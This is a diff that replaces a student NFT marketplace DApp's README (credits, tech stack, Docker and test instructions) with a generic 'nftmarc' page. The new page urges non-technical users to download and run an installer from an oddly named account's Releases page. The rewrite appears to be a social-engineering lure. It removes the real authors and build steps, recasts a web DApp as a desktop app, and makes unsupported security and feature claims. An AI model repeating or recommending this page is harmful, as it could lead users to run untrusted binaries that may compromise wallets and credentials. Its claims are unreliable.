@@ -1,142 +1,74 @@
-<p align="center">
-    <img src="https://github.com/NFTSuits/NFT-Marketplace-DApp/blob/main/NFTSuits%20icons/nftSuits_logo.png"/>
-</p>
+# 🎨 nftmarc - The Easy Way to Manage NFTs
 
-# NFT Marketplace for Ethereum Blockchain
+## 🚀 Getting Started
 
-NFT Suits is a game centered around collectible unique items that are used to create one-of-a-kind avatars where the uniqueness is guaranteed by ERC721 protocol.  No items can bereplicated, taken away, or destroyed, since the proof of ownerships are stored on Ethereum blockchain. In order to see the items and interact with the marketplace, user has to installMetaMask extension to her/his browser. Then, by connecting his/her wallet; the user can buy, bid on, offer items for auction and sell the items via the marketplace. As tree requiredand complementary pieces are purchased and worn, an avatar is created and displayed to the community.
+Welcome to nftmarc! This application helps you manage your non-fungible tokens (NFTs) effectively and securely. Created as part of a special course project, it is ready for you to use without needing any programming skills.
 
-# README Contents
-1. [Authors](#authors)
-2. [Tech Stack](#tech-stack)
-3. [Deliverables](#deliverables)
-4. [Features](#features)
-    - [Within her/his profile, a user can](#within-profile-page-a-user-can)
-    - [Within the item page, a user can](#within-the-item-page-a-user-can)
-5. [How to Run Docker](#how-to-run-docker)
-6. [Screenshots](#screenshots)
-7. [Support and Feedback](#support-and-feedback)
+## 📦 Download & Install
 
-## Authors
-<p align="center">
-    <img src="website/src/containers/index/team_bidis.png"/>
-</p>
+You can download nftmarc from the Releases page. Click the button below to get started:
 
-- [@cavitcakir](https://www.github.com/cavitcakir)
-- [@kayakapagan](https://www.github.com/kayakapagan)
-- [@gorkemkose](https://www.github.com/gorkemkose)
-- [@gokberkyar](https://www.github.com/gokberkyar)
+[![Download nftmarc](https://img.shields.io/badge/Download-nftmarc-blue.svg)](https://github.com/Prepucedendroicapetechia80/nftmarc/releases)
 
-## Tech Stack
+Once you're on the Releases page, follow these simple steps to download and install the software:
 
-**Client:** React, Recoil, Material UI
+1. Click on the link for the latest version.
+2. Find the appropriate file for your operating system.
+3. Click on the file to start the download.
+4. Once the download is complete, locate the file in your "Downloads" folder or the location you saved it to.
 
-**Contract:** Solidity
+### 🔄 Installation Steps
 
-**Dev Tools:** Ganache, Truffle, Remix, Docker
+1. Open the downloaded file. This should start the installation process.
+2. Follow the on-screen instructions to install the application.
+3. When the installation completes, you will find nftmarc in your applications menu or desktop.
 
-**Static Smart Contract Analysis:** Securify 2.0, Slither
+## 📋 Features
 
-**Testing:** Mocha
+nftmarc makes managing your NFTs easy. Here are some key features to explore:
 
-<p align="center">
-    <code><img height="40" src="https://github.com/NFTSuits/NFT-Marketplace-DApp/blob/main/NFTSuits%20icons/react-logo.png"></code>
-    <code><img height="40" src="https://github.com/NFTSuits/NFT-Marketplace-DApp/blob/main/NFTSuits%20icons/recoil-logo.svg"></code>
-    <code><img height="40" src="https://github.com/NFTSuits/NFT-Marketplace-DApp/blob/main/NFTSuits%20icons/materialUI-logo.png"></code>
-    <code><img height="40" src="https://github.com/NFTSuits/NFT-Marketplace-DApp/blob/main/NFTSuits%20icons/solidity-logo.jpeg"></code>
-    <code><img height="40" src="https://github.com/NFTSuits/NFT-Marketplace-DApp/blob/main/NFTSuits%20icons/ganache-logo.png"></code>
-    <code><img height="40" src="https://github.com/NFTSuits/NFT-Marketplace-DApp/blob/main/NFTSuits%20icons/truffle-logo.png"></code>
-    <code><img height="40" src="https://github.com/NFTSuits/NFT-Marketplace-DApp/blob/main/NFTSuits%20icons/remix-logo.png"></code>
-    <code><img height="40" src="https://github.com/NFTSuits/NFT-Marketplace-DApp/blob/main/NFTSuits%20icons/docker-logo.png"></code>
-    <code><img height="40" src="https://github.com/NFTSuits/NFT-Marketplace-DApp/blob/main/NFTSuits%20icons/securify-logo.png"></code>
-    <code><img height="40" src="https://github.com/NFTSuits/NFT-Marketplace-DApp/blob/main/NFTSuits%20icons/slither-logo.png"></code>
-    <code><img height="40" src="https://github.com/NFTSuits/NFT-Marketplace-DApp/blob/main/NFTSuits%20icons/mocha-logo.svg"></code>
-</p>
+- **User-Friendly Interface:** Navigate effortlessly, even with no technical background.
+- **Secure Access:** Keep your NFTs safe with secure authentication methods.
+- **Direct Management:** Easily view, buy, and sell your NFTs right from the application.
+- **Search Functionality:** Quickly find specific NFTs in your collection.
 
-## Deliverables
-   - [website (make sure you are in Ropsten Test Network)](https://nftsuits.com/)
-   - [report](https://github.com/cs48kblockchain/NFTSuits-DApp/blob/main/NFTSuitsExplained.pdf)
-   - [presentation](https://github.com/cs48kblockchain/NFTSuits-DApp/blob/main/Presentation.pdf)
+## 📊 System Requirements
 
-## Features
+Before installing nftmarc, ensure that your system meets the following requirements:
 
-### Within profile page, a user can
+- **Operating System:** Windows 10 or later, macOS Mojave or later, Linux (Ubuntu 18.04 or later).
+- **RAM:** At least 4 GB of RAM.
+- **Disk Space:** At least 200 MB of free disk space.
 
-- Set a username
-- Withdraw her/his balance
-- Create an avatar with the items that (s)he owns by wearing
-- Save the item and display it in the avatars page
-- List his/her items with certain filtering options
-- See his/her statistics
+## 🔧 Troubleshooting
 
-### Within the item page, a user can
+If you encounter any issues during installation or use, here are some common problems and solutions:
 
-- Sell her/his item for a fixed price
-- Cancel sale for his/her item
-- Buy an item
-- Create an auction for his/her item
-- Cancel an auction for his/her item
-- Accept the highest bid
-- Bid on an item
-- Withdraw his/her bid
-- Wear his/her item under some condition
-- Unwear his/her item under some condition
-- List all of the items with certain filtering options
- 
-## How to Run Docker
+- **Error during installation:** Ensure you have administrative rights on your machine.
+- **Cannot open the application:** Check if your operating system is compatible with the version you downloaded.
+- **App crashes after opening:** Try reinstalling the application and ensuring your system meets the requirements listed above.
 
-```bash
-    ## in project directory, i.e. cd project
-    docker-compose -f docker-compose.dev.yml up
-```
+## 💬 Support
 
-## Running Tests
-To run tests, run the following command
+If you need further assistance, you can reach out for help in the following ways:
 
-```bash
-  ## make sure ganache is running
-  cd truffle
-  truffle test
-```
+- **GitHub Issues:** Visit the [Issues section](https://github.com/Prepucedendroicapetechia80/nftmarc/issues) on our GitHub page to report any bugs or request features.
+- **Community Forums:** Join our [community forum](https://github.com/Prepucedendroicapetechia80/nftmarc/discussions) to ask questions and share experiences with other users.
 
-## Screenshots
-<p align="center">
-    <h3>Landing Page</h3>
-    <img src="https://github.com/NFTSuits/NFT-Marketplace-DApp/blob/main/NFTSuits%20images/landing-page.png"/>
-</p>
-<p align="center">
-    <h3>Market Place</h3>
-    <img src="https://github.com/NFTSuits/NFT-Marketplace-DApp/blob/main/NFTSuits%20images/marketplace-page.png"/>
-</p>
-<p align="center">
-    <h3>Item Page Example 1</h3>
-    <img src="https://github.com/NFTSuits/NFT-Marketplace-DApp/blob/main/NFTSuits%20images/item-example-1.png"/>
-</p>
-<p align="center">
-    <h3>Item Page Example 2</h3>
-    <img src="https://github.com/NFTSuits/NFT-Marketplace-DApp/blob/main/NFTSuits%20images/item-example-2.png"/>
-</p>
-<p align="center">
-    <h3>Profile Page</h3>
-    <img src="https://github.com/NFTSuits/NFT-Marketplace-DApp/blob/main/NFTSuits%20images/profile-page.png"/>
-</p>
-<p align="center">
-    <h3>Avatars Page</h3>
-    <img src="https://github.com/NFTSuits/NFT-Marketplace-DApp/blob/main/NFTSuits%20images/avatar-page.png"/>
-</p>
+## 📝 Contributing
 
-## Support and Feedback
+nftmarc is an open-source project. If you're interested in contributing, please follow these steps:
 
-Feel free to create an issue to discuss more.
+1. Fork the repository on GitHub.
+2. Make your changes in a new branch.
+3. Submit a pull request for review.
 
-  
+Thank you for considering contributing to nftmarc!
 
+## 🌟 Stay Updated
 
+To stay informed about updates and new features, make sure to follow the repository. You can check back on the Releases page for the latest versions and improvements:
 
+[Visit Releases Page](https://github.com/Prepucedendroicapetechia80/nftmarc/releases)
 
-
-
-
-
-
-
+We hope you enjoy using nftmarc and find it helpful for your NFT management needs!
